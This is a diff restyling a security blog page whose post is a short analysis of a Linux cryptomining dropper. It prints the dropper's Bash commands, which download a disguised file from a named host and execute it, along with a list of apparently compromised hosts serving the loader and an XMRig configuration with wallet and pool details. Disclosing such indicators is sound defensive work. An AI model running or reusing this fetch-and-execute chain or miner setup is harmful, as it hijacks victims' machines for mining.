@@ -9,7 +9,10 @@
     <title>Fakhri Zulkifli</title>
 
     <!-- Bootstrap -->
-    <link rel="stylesheet" href="/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/bootstrap-4.0.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/fontawesome-5.13.0/css/fontawesome.css">
+    <link rel="stylesheet" href="/css/fontawesome-5.13.0/css/brands.css">
+    <link rel="stylesheet" href="/css/fontawesome-5.13.0/css/solid.css">
     <link rel="stylesheet" href="/css/main.css">
 
     <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
@@ -39,24 +42,23 @@
       <div class="container">
 
         <header class="row">
-  <div class="col-lg-8 col-lg-offset-2">
+  <div class="col-lg-8 col-lg-offset-2" style="margin: auto">
     <h1 class="">Fakhri Zulkifli</h1>
     <p>
-    <div align="center">
-    <a href="https://github.com/fakhrizulkifli" target="_blank"><span class="string">https://github.com/fakhrizulkifli</a>
-    •
-    <a href="https://twitter.com/d0lph1n98" target="_blank"><span class="string">https://twitter.com/d0lph1n98</a>
+    <div style="margin: auto">
+    <a href="https://github.com/fakhrizulkifli" target="_blank"><span style="font-size: large" class="fab fa-github-square"></span></a>
+    <a href="https://twitter.com/d0lph1n98" target="_blank"><span style="font-size: large" class="fab fa-twitter-square"></span></a>
+    <a href="https://linkedin.com/fakhrizulkifli" target="_blank"><span style="font-size: large" class="fab fa-linkedin"></span></a>
     </div>
     </p>
   </div>
 </header>
 
 <div class="row">
-  <div class="col-lg-8 col-lg-offset-2">
+  <div style="width:-webkit-fill-available">
     <div class="menu">
       <ul>
-          <li><a href="/">home</a></li>
-          <li><a href="/blog/">blog</a></li>
+          <li><a href="/blog/">/root</a></li>
       </ul>
     </div>
   </div>
@@ -65,12 +67,12 @@
 
 
         <div class="row">
-          <div class="col-lg-8 col-lg-offset-2">
+          <div style="width:-webkit-fill-available">
             <main>
             <div class="post">
 
   <header class="post-header">
-    <h1>4ec4f1ec6a030c4969bd336258f6699e</h1>
+    <h1 style="text-align: center">4ec4f1ec6a030c4969bd336258f6699e</h1>
   </header>
 
   <article class="post-content">
@@ -87,7 +89,7 @@
   <article class="post-content">
   <p>Initial file dropped was a Bash file containing following commands:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> <span class="nt">-f</span> /var/tmp/.sys.log
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> <span class="nt">-f</span> /var/tmp/.sys.log
 curl http://www.bizqsoft.com/imgtemplate/11.png <span class="nt">-o</span> /var/tmp/.sys.log <span class="o">||</span> wget http://www.bizqsoft.com/imgtemplate/11.png <span class="nt">-O</span> /var/tmp/.sys.log
 <span class="nb">chmod </span>0777 /var/tmp/.sys.log
 /var/tmp/.sys.log
@@ -95,24 +97,24 @@ curl http://www.bizqsoft.com/imgtemplate/11.png <span class="nt">-o</span> /var/
 
 <p>File <code class="highlighter-rouge">11.png</code> was found packed using UPX packer. After the decompression, a list of websites has been found which is potentially has been compromised and used to host the loader for the bot.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[
-    "http://www.ltj4949.com/weixin/loader.gif",
-    "http://128.1.49.78/phpmyadmin/loader.gif",
-    "http://111.231.230.124/data/loader.gif",
-    "http://124.42.117.172/yjcm/loader.gif",
-    "http://180.76.114.216/log/loader.gif",
-    "http://103.17.95.45/log/loader.gif",
-    "http://car.earthstudio.cn/static/img/loader.gif",
-    "http://111.231.239.187/loader/loader.gif",
-    "http://120.27.33.177:80/phpMyAdmin/locale/loader.gif",
-    "http://120.55.53.187:80/website/e/data/loader.gif",
-    "http://47.100.24.187:80/Mobile/data/loader.gif",
-    "http://117.48.211.158:80/phpMyAdmin/locale/loader.gif",
-    "http://47.97.217.130:80/heart_health/vendor/loader.gif",
-    "http://132.148.151.76:80/phpMyAdmin/locale/loader.gif",
-    "http://39.109.113.71/phpmyadmin/setup/loader.gif"
-]
-</code></pre></div></div>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
+    </span><span class="s2">"http://www.ltj4949.com/weixin/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://128.1.49.78/phpmyadmin/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://111.231.230.124/data/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://124.42.117.172/yjcm/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://180.76.114.216/log/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://103.17.95.45/log/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://car.earthstudio.cn/static/img/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://111.231.239.187/loader/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://120.27.33.177:80/phpMyAdmin/locale/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://120.55.53.187:80/website/e/data/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://47.100.24.187:80/Mobile/data/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://117.48.211.158:80/phpMyAdmin/locale/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://47.97.217.130:80/heart_health/vendor/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://132.148.151.76:80/phpMyAdmin/locale/loader.gif"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://39.109.113.71/phpmyadmin/setup/loader.gif"</span><span class="w">
+</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
 
 <p>Further analysis shows that a miner is being fetched from any live domain from the list.</p>
 
@@ -124,149 +126,149 @@ User-Agent: Mozilla/5.0 <span class="o">(</span>Windows<span class="p">;</span> 
 
 <p>XMRig miner credentials</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
-    "id": 1,
-    "jsonrpc": "2.0",
-    "method": "login",
-    "params": {
-        "agent": "XMRig/2.6.4 (Linux i686) libuv/1.19.3-dev gcc/7.2.0",
-        "algo": [
-            "cn/1",
-            "cn/0",
-            "cn/xtl",
-            "cn/msr",
-            "cn/xao",
-            "cn/rto",
-            "cn"
-        ],
-        "login": "4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY",
-        "pass": "x"
-    }
-}
-</code></pre></div></div>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"jsonrpc"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2.0"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"method"</span><span class="p">:</span><span class="w"> </span><span class="s2">"login"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"params"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"agent"</span><span class="p">:</span><span class="w"> </span><span class="s2">"XMRig/2.6.4 (Linux i686) libuv/1.19.3-dev gcc/7.2.0"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"algo"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+            </span><span class="s2">"cn/1"</span><span class="p">,</span><span class="w">
+            </span><span class="s2">"cn/0"</span><span class="p">,</span><span class="w">
+            </span><span class="s2">"cn/xtl"</span><span class="p">,</span><span class="w">
+            </span><span class="s2">"cn/msr"</span><span class="p">,</span><span class="w">
+            </span><span class="s2">"cn/xao"</span><span class="p">,</span><span class="w">
+            </span><span class="s2">"cn/rto"</span><span class="p">,</span><span class="w">
+            </span><span class="s2">"cn"</span><span class="w">
+        </span><span class="p">],</span><span class="w">
+        </span><span class="nl">"login"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
 
 <p>Below is the list of mining server being use by the miner:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
-    "algo": "cryptonight",
-    "api": {
-        "port": 0,
-        "access-token": null,
-        "worker-id": null,
-        "ipv6": false,
-        "restricted": true
-    },
-    "av": 0,
-    "background": false,
-    "colors": true,
-    "cpu-affinity": null,
-    "cpu-priority": null,
-    "donate-level": 1,
-    "huge-pages": true,
-    "hw-aes": null,
-    "log-file": null,
-    "max-cpu-usage": 75,
-    "pools": [
-        {
-            "url": "sg.minexmr.com:4444",
-            "user": "4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": false,
-            "keepalive": false,
-            "variant": 1
-        },
-        {
-            "url": "sg.minexmr.com:80",
-            "user": "4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": false,
-            "keepalive": false,
-            "variant": 1
-        },
-        {
-            "url": "sg.minexmr.com:443",
-            "user": "4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": false,
-            "keepalive": false,
-            "variant": 1
-        },
-        {
-            "url": "pool.minexmr.com:4444",
-            "user": "4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": false,
-            "keepalive": false,
-            "variant": 1
-        },
-        {
-            "url": "pool.minexmr.com:80",
-            "user": "4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": false,
-            "keepalive": false,
-            "variant": 1
-        },
-        {
-            "url": "pool.minexmr.com:443",
-            "user": "4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": false,
-            "keepalive": false,
-            "variant": 1
-        },
-        {
-            "url": "xmr-usa.dwarfpool.com:8005 ",
-            "user": "4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": false,
-            "keepalive": false,
-            "variant": 1
-        },
-        {
-            "url": "xmr-usa.dwarfpool.com:8080",
-            "user": "4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": false,
-            "keepalive": false,
-            "variant": 1
-        },
-        {
-            "url": "pool.monero.hashvault.pro:443",
-            "user": "4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": false,
-            "keepalive": false,
-            "variant": 1
-        },
-        {
-            "url": "pool.monero.hashvault.pro:443",
-            "user": "4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": false,
-            "keepalive": false,
-            "variant": 1
-        }
-    ],
-    "print-time": 600,
-    "retries": 3,
-    "retry-pause": 3,
-    "safe": false,
-    "threads": null,
-    "user-agent": null,
-    "watch": false
-}
-</code></pre></div></div>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"algo"</span><span class="p">:</span><span class="w"> </span><span class="s2">"cryptonight"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"api"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"port"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"access-token"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"worker-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"ipv6"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"restricted"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="nl">"av"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"background"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"colors"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"cpu-affinity"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"cpu-priority"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"donate-level"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"huge-pages"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"hw-aes"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"log-file"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"max-cpu-usage"</span><span class="p">:</span><span class="w"> </span><span class="mi">75</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"pools"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sg.minexmr.com:4444"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sg.minexmr.com:80"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sg.minexmr.com:443"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pool.minexmr.com:4444"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pool.minexmr.com:80"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pool.minexmr.com:443"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"xmr-usa.dwarfpool.com:8005 "</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"xmr-usa.dwarfpool.com:8080"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pool.monero.hashvault.pro:443"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pool.monero.hashvault.pro:443"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">],</span><span class="w">
+    </span><span class="nl">"print-time"</span><span class="p">:</span><span class="w"> </span><span class="mi">600</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"retries"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"retry-pause"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"safe"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"threads"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"user-agent"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"watch"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
 
   </article>
 
@@ -301,7 +303,7 @@ User-Agent: Mozilla/5.0 <span class="o">(</span>Windows<span class="p">;</span> 
         </div>
 
         <div class="row">
-  <div class="col-lg-8 col-lg-offset-2">
+  <div style="width:-webkit-fill-available">
     <footer>
       
     </footer>
